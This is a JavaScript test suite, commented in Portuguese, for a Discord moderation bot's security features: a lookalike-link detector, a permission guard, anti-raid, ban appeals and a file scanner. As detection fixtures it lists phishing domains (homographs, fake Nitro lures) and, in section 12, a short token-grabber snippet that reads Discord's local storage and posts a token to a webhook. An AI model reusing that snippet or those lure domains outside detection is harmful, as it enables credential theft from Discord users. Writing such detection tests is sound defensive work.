const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

console.log('🛡️ Testes do escudo de links e do guardião do servidor...');

process.env.PYXIE_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'pyxie-security-'));

const { PermissionFlagsBits } = require('discord.js');
const links = require('../src/services/lookalikeLinks');
const safety = require('../src/services/guildSafety');
const guard = require('../src/services/serverGuard');
const alerts = require('../src/services/securityAlerts');
const linkShield = require('../src/modules/link-shield');
const serverGuard = require('../src/modules/server-guard');
const antiRaid = require('../src/modules/anti-raid');
const raid = require('../src/services/raidWatch');
const { TRANSLATIONS } = require('../src/utils/i18n');

const G = '1453890868980482090';
const STAFF = '777777777777777777';
const ROLE = '666666666666666666';
const CHANNEL = '555555555555555555';

(async () => {
  try {
    // 1. Detector: pega golpe e deixa passar site legítimo.
    const bad = {
      'https://dіscord.com/gift/abc': 'homograph',
      'https://disc0rd.com/x': 'lookalike',
      'https://discrod.com': 'typo',
      'https://discord.xyz/nitro': 'tld',
      'https://discord-nitro.gift/claim': 'lure',
      'https://free-nitro.com': 'lure',
      'https://discord.com.login-verify.ru/a': 'subdomain',
      'https://steamcommunlty.com/tradeoffer': 'lookalike',
      'https://раураl.com': 'homograph',
    };
    for (const [url, reason] of Object.entries(bad)) {
      const [hit] = links.findLookalikes(`olha isso ${url} !!`);
      assert.equal(hit?.reason, reason, `Marca ${url} como ${reason}`);
    }
    assert.equal(links.findLookalikes('[presente](https://disc0rd.com/x)')[0]?.imitates, 'discord.com', 'Link mascarado também é conferido');
    const good = [
      'https://discord.com/channels/1', 'https://cdn.discordapp.com/a.png', 'https://discord.gift/abc', 'https://discords.com/servers',
      'https://discord.me/cringe', 'https://twister.com', 'https://discord.js.org', 'https://top.gg/bot/1', 'https://www.google.com.br',
      'https://pt.wikipedia.org/wiki/Discord', 'https://ação.com.br', 'https://discordpy.readthedocs.io', 'sem link nenhum aqui',
    ];
    for (const text of good) assert.deepEqual(links.findLookalikes(text), [], `Não marca ${text}`);
    assert.deepEqual(links.findLookalikes('https://disc0rd.com/x', { allowDomains: ['disc0rd.com'] }), [], 'Domínio liberado pelo servidor passa');
    assert.deepEqual(links.normalizeDomainList('https://Exemplo.com.br/x\n*.site.org lixo'), ['exemplo.com.br', 'site.org']);
    assert.equal(links.findLookalikes(Array(30).fill('https://disc0rd.com/x').join(' ')).length, 1, 'Mesmo endereço repetido conta uma vez');
    console.log('  ✅ 1. Detector de links que imitam sites conhecidos.');

    // 2. Configuração por servidor e registro de ocorrências (arquivos separados, escrita atômica).
    const def = safety.getConfig(G, { fresh: true });
    assert.equal(def.linkShield.enabled, true);
    assert.equal(def.guard.mode, 'alert');
    const saved = safety.saveConfig(G, { staffLogChannelId: 'abc', linkShield: { action: 'nada' }, guard: { mode: 'auto' } });
    assert.equal(saved.staffLogChannelId, '', 'ID inválido vira vazio');
    assert.equal(saved.linkShield.action, 'delete', 'Ação desconhecida volta ao padrão');
    assert.equal(saved.guard.mode, 'auto');
    safety.saveConfig(G, { staffLogChannelId: STAFF, guard: { mode: 'alert' } });
    for (let i = 0; i < 60; i++) safety.recordEvent(G, { type: 'link', host: 'x.com' });
    const ev = safety.readEvents(G);
    assert.equal(ev.counters.link, 60);
    assert.equal(ev.events.length, 50, 'Guarda só as 50 últimas');
    assert(!fs.existsSync(path.join(process.env.PYXIE_DATA_DIR, 'guilds', G, 'security.json.tmp')), 'Sem sobra de .tmp');
    console.log('  ✅ 2. Configuração e ocorrências por servidor.');

    // 3. Regras do guardião.
    const A = PermissionFlagsBits.Administrator;
    assert.deepEqual(guard.gainedDangerous(0n, A | PermissionFlagsBits.SendMessages), ['Administrator']);
    assert.deepEqual(guard.gainedDangerous(A, A), [], 'Já tinha: não alerta');
    assert.deepEqual(guard.gainedDangerous(A, 0n), [], 'Perder permissão não alerta');
    assert.equal(guard.isChannelLeak({ categoryPublic: false, nowPublic: true, wasPublic: false }), true);
    assert.equal(guard.isChannelLeak({ categoryPublic: false, nowPublic: true, isNew: true }), true);
    assert.equal(guard.isChannelLeak({ categoryPublic: false, nowPublic: true, wasPublic: true }), false, 'Já era aberto: não alerta de novo');
    assert.equal(guard.isChannelLeak({ categoryPublic: true, nowPublic: true, isNew: true }), false, 'Categoria aberta: normal');
    const rid = guard.ids.revert(G, ROLE, ['Administrator', 'BanMembers']);
    assert(rid.length <= 100, 'customId cabe no limite do Discord');
    assert.deepEqual(guard.parseId(rid), { kind: 'role', guildId: G, targetId: ROLE, names: ['Administrator', 'BanMembers'] });
    assert.deepEqual(guard.parseId(guard.ids.lock(G, CHANNEL)), { kind: 'lock', guildId: G, targetId: CHANNEL });
    assert.equal(guard.parseId('sg:role:abc:1:z'), null);
    assert.equal(guard.shouldAlert('k', 1000), true);
    assert.equal(guard.shouldAlert('k', 2000), false, 'Mesmo alvo em menos de 1 min não repete');
    assert.equal(guard.shouldAlert('k', 70000), true);
    guard.resetMemory();
    console.log('  ✅ 3. Regras do guardião (permissões, canal vazado, botões).');

    // 4. Escudo de links no Discord (objetos falsos).
    const out = { channel: [], replies: [], dms: [], staff: [] };
    const staffChannel = { isTextBased: () => true, send: async (p) => out.staff.push(p) };
    const guild = {
      id: G,
      name: 'Cringelândia',
      ownerId: '111111111111111111',
      channels: { cache: new Map([[STAFF, staffChannel]]), fetch: async () => null },
    };
    const client = { user: { id: '999999999999999999' } };
    let deleted = 0;
    const msg = (content, extra = {}) => ({
      guild,
      content,
      deletable: true,
      channel: { id: '444444444444444444', send: async (p) => (out.channel.push(p), { delete: async () => {} }) },
      author: { id: '222222222222222222', bot: false, send: async (p) => out.dms.push(p) },
      delete: async () => {
        deleted++;
      },
      reply: async (p) => out.replies.push(p),
      ...extra,
    });
    const r = await linkShield.onMessage(msg('ganhe nitro https://dіscord.com/gift'), client);
    assert.equal(r.deleted, true);
    assert.equal(deleted, 1);
    assert.match(out.channel[0].content, /discord\.com/);
    assert.deepEqual(out.channel[0].allowedMentions.parse, [], 'Aviso no canal não notifica ninguém');
    assert.match(out.dms[0].content, /senha/, 'DM sugere trocar a senha');
    assert.equal(out.staff.length, 1, 'Registro para a staff');
    assert.equal(safety.readEvents(G).events[0].action, 'deleted');
    assert.equal(await linkShield.onMessage(msg('https://discord.com/channels/1'), client), null, 'Link verdadeiro passa');
    assert.equal(await linkShield.onMessage(msg('https://disc0rd.com', { author: { id: client.user.id } }), client), null, 'Ignora a própria Pyxie');

    safety.saveConfig(G, { linkShield: { action: 'warn' } });
    guard.resetMemory();
    const w = await linkShield.onMessage(msg('https://disc0rd.com/x'), client);
    assert.equal(w.deleted, false);
    assert.equal(deleted, 1, 'Modo só avisar não apaga');
    assert.equal(out.replies.length, 1, 'Responde a própria mensagem com o aviso');
    safety.saveConfig(G, { linkShield: { enabled: false } });
    assert.equal(await linkShield.onMessage(msg('https://disc0rd.com/x'), client), null, 'Desligado não faz nada');
    safety.saveConfig(G, { linkShield: { enabled: true, action: 'delete' } });
    console.log('  ✅ 4. Escudo de links: apaga, avisa sem ping, DM acolhedora, modo só avisar.');

    // 5. Guardião no Discord: cargo e canal.
    guard.resetMemory();
    out.staff.length = 0;
    let newBits = null;
    const auditFor = (executorId) => ({
      members: { me: { permissions: { has: (f) => (executorId ? f === PermissionFlagsBits.ViewAuditLog : false) } } },
      fetchAuditLogs: async () => ({ entries: [{ targetId: ROLE, createdTimestamp: Date.now(), executorId }, { targetId: CHANNEL, createdTimestamp: Date.now(), executorId }] }),
    });
    const role = (g) => ({ id: ROLE, name: 'Mods', managed: false, editable: true, guild: g, permissions: { bitfield: A | PermissionFlagsBits.SendMessages }, setPermissions: async (b) => (newBits = b) });
    const g1 = { ...guild, ...auditFor(null) };
    const res1 = await serverGuard.onRoleChange({ permissions: { bitfield: PermissionFlagsBits.SendMessages } }, role(g1), client);
    assert.deepEqual(res1, { names: ['Administrator'], reverted: false }, 'Sem registro de auditoria: só alerta');
    assert.equal(out.staff.length, 1);
    const payload = out.staff[0];
    assert.match(payload.embeds[0].data.title, /^🔐/);
    assert.equal(payload.components[0].components[0].data.custom_id, guard.ids.revert(G, ROLE, ['Administrator']));

    safety.saveConfig(G, { guard: { mode: 'auto' } });
    guard.resetMemory();
    const g2 = { ...guild, ...auditFor('333333333333333333') };
    const res2 = await serverGuard.onRoleChange(null, role(g2), client);
    assert.equal(res2.reverted, true, 'Modo automático desfaz quando sabe quem foi');
    assert.equal(newBits, PermissionFlagsBits.SendMessages, 'Tira só a permissão perigosa');
    guard.resetMemory();
    const g3 = { ...guild, ...auditFor(guild.ownerId) };
    assert.equal(await serverGuard.onRoleChange(null, role(g3), client), null, 'Mudança do dono não gera alerta');

    guard.resetMemory();
    let locked = false;
    const perms = (open) => ({ has: () => open });
    const chan = (g, open, parentId = '123456789012345678') => ({
      id: CHANNEL,
      name: 'staff-chat',
      type: 0,
      guild: g,
      parentId,
      isThread: () => false,
      manageable: true,
      parent: { name: 'Staff', permissionsFor: () => perms(false) },
      permissionsFor: () => perms(open),
      permissionOverwrites: { edit: async () => (locked = true) },
    });
    const g4 = { ...g2, roles: { everyone: { id: G } } };
    const res4 = await serverGuard.onChannelChange(chan(g4, false), chan(g4, true), client);
    assert.deepEqual(res4, { locked: true }, 'Canal que abriu na categoria fechada é trancado no modo automático');
    assert(locked);
    guard.resetMemory();
    assert.equal(await serverGuard.onChannelChange(chan(g4, true), chan(g4, true), client), null, 'Canal que já era aberto não alerta');
    safety.saveConfig(G, { guard: { mode: 'alert' } });
    console.log('  ✅ 5. Guardião: alerta com botão, desfaz no automático, ignora o dono, tranca canal.');

    // 6. Botões: só dono ou Administrador desfazem.
    newBits = null;
    const replies = [];
    const updates = [];
    const roleObj = role(g1);
    const g5 = {
      ...guild,
      roles: { cache: new Map([[ROLE, roleObj]]) },
      members: { fetch: async (id) => ({ permissions: { has: (f) => id === '333333333333333333' && f === A } }) },
    };
    const bclient = { ...client, guilds: { cache: new Map([[G, g5]]) } };
    const click = (userId) => ({
      isButton: () => true,
      customId: guard.ids.revert(G, ROLE, ['Administrator']),
      user: { id: userId, tag: 'x' },
      reply: async (p) => replies.push(p),
      update: async (p) => updates.push(p),
    });
    await serverGuard.handleInteraction(click('444444444444444444'), bclient);
    assert.equal(replies.length, 1, 'Sem Administrador: recusa');
    assert.equal(newBits, null);
    await serverGuard.handleInteraction(click('333333333333333333'), bclient);
    assert.equal(newBits, PermissionFlagsBits.SendMessages, 'Administrador desfaz');
    assert.deepEqual(updates[0].components, [], 'Botões somem depois de usados');
    console.log('  ✅ 6. Botões do alerta conferem permissão.');

    // 7. Textos: mesmas chaves e marcadores em pt e en; todo motivo tem texto.
    const flat = (o, p = '') => Object.entries(o).flatMap(([k, v]) => (typeof v === 'object' ? flat(v, `${p}${k}.`) : [[`${p}${k}`, v]]));
    for (const ns of ['linkShield', 'serverGuard', 'securityAlerts', 'antiRaid', 'appeals', 'fileShield']) {
      const pt = Object.fromEntries(flat(TRANSLATIONS.pt[ns]));
      const en = Object.fromEntries(flat(TRANSLATIONS.en[ns]));
      assert.deepEqual(Object.keys(en).sort(), Object.keys(pt).sort(), `${ns}: mesmas chaves`);
      for (const k of Object.keys(pt)) {
        const ph = (s) => (s.match(/\{\w+\}/g) || []).sort().join();
        assert.equal(ph(en[k]), ph(pt[k]), `${ns}.${k}: mesmos marcadores`);
      }
    }
    for (const reason of new Set(Object.values(bad))) assert(TRANSLATIONS.pt.linkShield.reason[reason] && TRANSLATIONS.en.linkShield.reason[reason], `Motivo ${reason} tem texto`);
    for (const name of guard.DANGEROUS) assert(TRANSLATIONS.en.serverGuard.perm[name], `Permissão ${name} tem nome`);
    const chAlert = alerts.channelAlert('en', { guildId: G, serverName: 'S', channelId: CHANNEL, categoryName: 'Staff', executorId: null, locked: false, viaDm: true, panelUrl: 'https://pyxie.test/dashboard' });
    assert.match(chAlert.embeds[0].data.description, /\[dashboard\]\(https:\/\/pyxie\.test\/dashboard\)/, 'Link mascarado para o painel na DM');
    assert(!/━|═/.test(JSON.stringify(chAlert)), 'Sem divisores ASCII');
    console.log('  ✅ 7. Textos bilíngues e embeds no padrão.');

    // 8. Anti-raid: limite, contas novas, piso em servidor grande, pausa nativa e botão.
    raid.resetMemory();
    const T0 = 1_000_000_000_000;
    const old = T0 - 400 * 24 * 3600 * 1000;
    let r8;
    for (let i = 0; i < 9; i++) r8 = raid.trackJoin('g1', { now: T0 + i * 1000, accountCreatedAt: old, joins: 10, seconds: 30 });
    assert.equal(r8.triggered, false, '9 contas antigas em 30 s não disparam');
    assert.equal(raid.trackJoin('g1', { now: T0 + 9000, accountCreatedAt: old, joins: 10, seconds: 30 }).triggered, true, 'A 10ª dispara');
    for (let i = 0; i < 5; i++) r8 = raid.trackJoin('g2', { now: T0 + i, accountCreatedAt: T0, joins: 10, seconds: 30 });
    assert.equal(r8.triggered, true, 'Metade do limite só de contas novas dispara');
    for (let i = 0; i < 20; i++) r8 = raid.trackJoin('g3', { now: T0 + i * 100, accountCreatedAt: old, joins: 10, seconds: 30, memberCount: 100000 });
    assert.equal(r8.triggered, false, 'Servidor de 100 mil membros precisa de 50');
    for (let i = 0; i < 10; i++) raid.trackJoin('g4', { now: T0 + i * 5000, accountCreatedAt: old, joins: 10, seconds: 30 });
    assert.equal(raid.trackJoin('g4', { now: T0 + 50000, accountCreatedAt: old, joins: 10, seconds: 30 }).triggered, false, 'Entradas espaçadas não disparam');

    raid.resetMemory();
    out.staff.length = 0;
    const puts = [];
    const rclient = { user: client.user, rest: { put: async (route, opts) => puts.push({ route, body: opts.body }) } };
    const rguild = { ...guild, memberCount: 50 };
    const joiner = () => ({ guild: rguild, user: { createdTimestamp: T0 } });
    let res8 = null;
    for (let i = 0; i < 5; i++) res8 = (await antiRaid.onMemberAdd(joiner(), rclient, T0 + i)) || res8;
    assert.equal(res8.paused, true);
    assert.equal(puts[0].route, `/guilds/${G}/incident-actions`);
    assert.equal(puts[0].body.invites_disabled_until, new Date(T0 + 4 + 60 * 60000).toISOString(), 'Pausa de 60 min por padrão');
    assert.equal(puts[0].body.dms_disabled_until, puts[0].body.invites_disabled_until);
    assert.equal(await antiRaid.onMemberAdd(joiner(), rclient, T0 + 10), null, 'Durante a pausa não dispara de novo');
    assert.equal(out.staff.length, 1, 'Um alerta por ataque');
    assert.equal(out.staff[0].components[0].components[0].data.custom_id, `ar:end:${G}`);
    assert.equal(safety.readEvents(G).counters.raid, 1);

    const rreplies = [];
    const rupdates = [];
    const g8 = { ...rguild, members: { fetch: async (id) => ({ permissions: { has: (f) => id === '333333333333333333' && f === PermissionFlagsBits.ManageGuild } }) } };
    const rbclient = { ...rclient, guilds: { cache: new Map([[G, g8]]) } };
    const end = (userId) => ({ isButton: () => true, customId: `ar:end:${G}`, user: { id: userId }, reply: async (p) => rreplies.push(p), update: async (p) => rupdates.push(p) });
    await antiRaid.handleInteraction(end('444444444444444444'), rbclient);
    assert.equal(rreplies.length, 1, 'Sem Gerenciar Servidor: recusa');
    await antiRaid.handleInteraction(end('333333333333333333'), rbclient);
    assert.equal(puts.at(-1).body.invites_disabled_until, null, 'Encerrar zera a pausa');
    assert.deepEqual(rupdates[0].components, []);
    safety.saveConfig(G, { antiRaid: { enabled: false } });
    raid.resetMemory();
    for (let i = 0; i < 20; i++) assert.equal(await antiRaid.onMemberAdd(joiner(), rclient, T0 + i), null);
    console.log('  ✅ 8. Anti-raid: limite, contas novas, servidor grande, pausa com prazo e botão.');

    // 9. Atividade: soma em memória, grava em lote, guarda 30 dias, dia de Brasília.
    const activity = require('../src/services/guildActivity');
    activity.resetMemory();
    const D = Date.UTC(2026, 9, 28, 12);
    assert.equal(activity.dayKey(Date.UTC(2026, 9, 28, 2)), '2026-10-27', '23h de Brasília ainda é o dia anterior');
    for (let i = 0; i < 5; i++) activity.bump(G, 'messages', D);
    activity.bump(G, 'joins', D);
    activity.bump(G, 'nada', D);
    activity.bump(G, 'messages', D - 40 * 86400000);
    assert.equal(activity.summary(G, D).hasData, false, 'Nada no disco antes de gravar');
    activity.flush(D);
    activity.bump(G, 'messages', D);
    activity.flush(D);
    const sum = activity.summary(G, D);
    assert.equal(sum.today.messages, 6, 'Soma o que já estava gravado');
    assert.equal(sum.week.joins, 1);
    assert.equal(sum.series.length, 30);
    const stored = JSON.parse(fs.readFileSync(path.join(process.env.PYXIE_DATA_DIR, 'guilds', G, 'activity.json'), 'utf8'));
    assert.deepEqual(Object.keys(stored.days), ['2026-10-28'], 'Dia com mais de 30 dias é descartado');
    assert(!JSON.stringify(stored).includes('222222222222222222'), 'Nenhum ID de pessoa guardado');
    console.log('  ✅ 9. Atividade do servidor: contagens em lote, 30 dias, sem dados pessoais.');

    // 10. Apelação de banimento: regras, envio para a staff, decisão e permissões.
    const appealsSvc = require('../src/services/banAppeals');
    const banAppeals = require('../src/modules/ban-appeals');
    const U = '777000000000000001';
    const N0 = 2_000_000_000_000;
    assert.equal(appealsSvc.create(G, { userId: U, username: 'x', text: 'curto' }, N0).reason, 'too_short');
    const first = appealsSvc.create(G, { userId: U, username: 'x', text: 'Peço desculpas, entendi o que fiz de errado.' }, N0);
    assert.equal(first.ok, true);
    assert.equal(appealsSvc.canAppeal(G, U, N0).reason, 'pending', 'Um pedido pendente por vez');
    assert.equal(appealsSvc.decide(G, first.appeal.id, { approved: false, by: 'm' }, N0 + 1).ok, true);
    assert.equal(appealsSvc.decide(G, first.appeal.id, { approved: true, by: 'm' }, N0 + 2).reason, 'already_decided', 'Decide uma vez só');
    assert.equal(appealsSvc.canAppeal(G, U, N0 + 10 * 86400000).reason, 'cooldown', 'Depois de recusa espera 30 dias');
    assert.equal(appealsSvc.canAppeal(G, U, N0 + 31 * 86400000).ok, true);
    assert.deepEqual(Object.keys(appealsSvc.publicView(first.appeal)).sort(), ['createdAt', 'decidedAt', 'status'], 'A pessoa não vê quem decidiu');

    banAppeals._setActive(true);
    safety.saveConfig(G, { appeals: { enabled: true, channelId: STAFF } });
    const V = '777000000000000002';
    const posted = [];
    let unbanned = null;
    const aguild = {
      ...guild,
      ownerId: '111111111111111111',
      iconURL: () => null,
      members: { me: { permissions: { has: (f) => f === PermissionFlagsBits.BanMembers } }, fetch: async (id) => ({ permissions: { has: (f) => id === '333333333333333333' && f === PermissionFlagsBits.BanMembers } }) },
      bans: { fetch: async ({ user }) => (user === V ? { reason: 'spam <@1> @everyone' } : null), remove: async (id) => (unbanned = id) },
      channels: { cache: new Map([[STAFF, { isTextBased: () => true, send: async (p) => (posted.push(p), { id: '999000000000000001' }) }]]), fetch: async () => null },
    };
    const aclient = { user: client.user, guilds: { cache: new Map([[G, aguild]]) }, users: { fetch: async () => ({ send: async () => {} }) } };
    const listed = await banAppeals.listForUser(aclient, { userId: V });
    assert.equal(listed[0].banned, true);
    assert.equal(listed[0].canAppeal, true);
    await assert.rejects(banAppeals.submit(aclient, { guildId: G, userId: U, username: 'x', text: 'x'.repeat(30) }), /not_banned/, 'Só quem está banido pede');
    await banAppeals.submit(aclient, { guildId: G, userId: V, username: 'Vi @everyone', text: 'Quero voltar, prometo respeitar as regras.' });
    assert.equal(posted.length, 1);
    assert.deepEqual(posted[0].allowedMentions.parse, [], 'Pedido na staff não notifica ninguém');
    assert(!posted[0].embeds[0].data.description.includes('@everyone'), 'Menções do texto ficam neutralizadas');
    await assert.rejects(banAppeals.submit(aclient, { guildId: G, userId: V, username: 'Vi', text: 'Mais um pedido para voltar, por favor.' }), /pending/);
    const appealId = appealsSvc.latestFor(G, V).id;
    const areplies = [];
    const aupdates = [];
    const press = (userId, choice) => ({ isButton: () => true, customId: `appeal:${choice}:${G}:${appealId}`, user: { id: userId, tag: 't' }, reply: async (p) => areplies.push(p), update: async (p) => aupdates.push(p) });
    await banAppeals.handleInteraction(press('444444444444444444', 'yes'), aclient);
    assert.equal(unbanned, null, 'Sem Banir Membros não desbane');
    await banAppeals.handleInteraction(press('333333333333333333', 'yes'), aclient);
    assert.equal(unbanned, V, 'Staff com Banir Membros desbane');
    assert.deepEqual(aupdates[0].components, [], 'Botões somem depois da decisão');
    assert.equal(appealsSvc.latestFor(G, V).status, 'approved');
    safety.saveConfig(G, { appeals: { enabled: false } });
    assert.deepEqual(await banAppeals.listForUser(aclient, { userId: V }), [], 'Servidor com apelação desligada não aparece');
    console.log('  ✅ 10. Apelação de banimento: regras, staff sem ping, desbanir com permissão.');

    // 11. Disjuntor de memória: entra a 85%, esvazia caches, volta abaixo de 75%.
    const mg = require('../src/services/memoryGuard');
    mg.reset();
    let cleared = 0;
    const changes = [];
    mg.onPressure(() => cleared++);
    mg.onStateChange((st) => changes.push(st));
    const at = (ratio) => () => ({ heapUsedMb: Math.round(768 * ratio), heapLimitMb: 768, ratio, loopP99Ms: 5 });
    assert.equal(mg.check(1, at(0.8)), 'normal');
    assert.equal(mg.check(2, at(0.86)), 'pressure');
    assert.equal(mg.isUnderPressure(), true);
    assert.equal(cleared, 1, 'Caches esvaziados ao entrar');
    assert.equal(mg.check(3, at(0.8)), 'pressure', 'Entre 75% e 85% continua (folga)');
    assert.equal(mg.check(4, at(0.7)), 'normal');
    assert.deepEqual(changes, ['pressure', 'normal']);
    mg.check(5, at(0.9));
    assert.equal(await require('../src/services/profileCardGenerator').generateProfileCard({ targetUser: { id: '1' } }), null, 'Sob pressão o perfil sai sem imagem');
    mg.reset();
    console.log('  ✅ 11. Disjuntor de memória com folga e caches esvaziados.');

    // 12. Escudo de arquivos e webhook vazado.
    const ft = require('../src/services/fileThreats');
    const grabber = 'p = os.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb"\nrequests.post("https://discord.com/api/webhooks/1/abc", json={"t": tok})';
    assert.equal(ft.scanText(grabber), 'grabber');
    assert.equal(ft.scanText('requests.post("https://discord.com/api/webhooks/1/abc", json={"content": "deploy ok"})'), null, 'Script comum com webhook passa');
    assert.equal(ft.triage({ name: 'nitro.EXE' }), 'exec');
    assert.equal(ft.triage({ name: 'grande.py', size: 900000 }), null, 'Arquivo grande nem é baixado');
    const fileShield = require('../src/modules/file-shield');
    guard.resetMemory();
    out.channel.length = 0;
    out.dms.length = 0;
    const fetchImpl = async () => ({ ok: true, arrayBuffer: async () => Buffer.from(grabber) });
    const fmsg = (name) => ({ ...msg(''), attachments: new Map([['1', { name, size: 200, url: 'https://cdn/x' }]]) });
    const fr = await fileShield.onMessage(fmsg('steal.py'), client, { fetchImpl });
    assert.equal(fr.hit.reason, 'grabber');
    assert.equal(fr.deleted, true);
    assert.match(out.dms[0].content, /senha/);
    assert.equal(await fileShield.onMessage(fmsg('foto.png'), client, { fetchImpl }), null, 'Imagem não é baixada');
    safety.saveConfig(G, { fileShield: { blockExecutables: false } });
    assert.equal(await fileShield.onMessage(fmsg('jogo.exe'), client, { fetchImpl }), null, 'Executável liberado quando o servidor quer');
    safety.saveConfig(G, { fileShield: { blockExecutables: true } });

    guard.resetMemory();
    out.staff.length = 0;
    let hookDeleted = false;
    const hookObj = { id: '888000000000000001', name: 'Avisos', type: 1, owner: { id: '555000000000000000' }, delete: async () => (hookDeleted = true) };
    const wmsg = (extra) => ({
      guild: { ...guild, ...auditFor(null) },
      webhookId: hookObj.id,
      content: '',
      deletable: true,
      delete: async () => {},
      author: { username: 'Avisos' },
      mentions: { everyone: false, users: { size: 0 } },
      channel: { id: CHANNEL, fetchWebhooks: async () => new Map([[hookObj.id, hookObj]]) },
      ...extra,
    });
    assert.equal(await serverGuard.onWebhookMessage(wmsg({ content: 'bom dia' }), client), null, 'Webhook normal passa');
    const w1 = await serverGuard.onWebhookMessage(wmsg({ mentions: { everyone: true, users: { size: 0 } } }), client);
    assert.deepEqual(w1, { reason: 'everyone', removed: false }, 'Modo alerta: avisa e não apaga o webhook');
    assert.equal(out.staff[0].components[0].components[0].data.custom_id, `sg:hook:${G}:${hookObj.id}`);
    guard.resetMemory();
    assert.equal(await serverGuard.onWebhookMessage(wmsg({ applicationId: hookObj.id, mentions: { everyone: true, users: { size: 0 } } }), client), null, 'Resposta de comando de bot é ignorada');
    guard.resetMemory();
    const own = { ...hookObj, owner: { id: client.user.id } };
    assert.equal(await serverGuard.onWebhookMessage(wmsg({ mentions: { everyone: true, users: { size: 0 } }, channel: { id: CHANNEL, fetchWebhooks: async () => new Map([[own.id, own]]) } }), client), null, 'Webhook da própria Pyxie é ignorado');
    const hclient = { ...client, guilds: { cache: new Map([[G, { ...guild, fetchWebhooks: async () => new Map([[hookObj.id, hookObj]]), members: { fetch: async (id) => ({ permissions: { has: (f) => id === '333333333333333333' && f === PermissionFlagsBits.ManageWebhooks } }) } }]]) } };
    const hupdates = [];
    await serverGuard.handleInteraction({ isButton: () => true, customId: `sg:hook:${G}:${hookObj.id}`, user: { id: '333333333333333333', tag: 'x' }, reply: async () => {}, update: async (p) => hupdates.push(p) }, hclient);
    assert.equal(hookDeleted, true, 'Gerenciar Webhooks basta para apagar o webhook');
    assert.deepEqual(hupdates[0].components, []);
    console.log('  ✅ 12. Escudo de arquivos e webhook vazado.');

    console.log('🎉 Escudo de links e guardião do servidor validados!');
  } finally {
    fs.rmSync(process.env.PYXIE_DATA_DIR, { recursive: true, force: true });
  }
})().catch((err) => {
  console.error(err);
  process.exit(1);
});
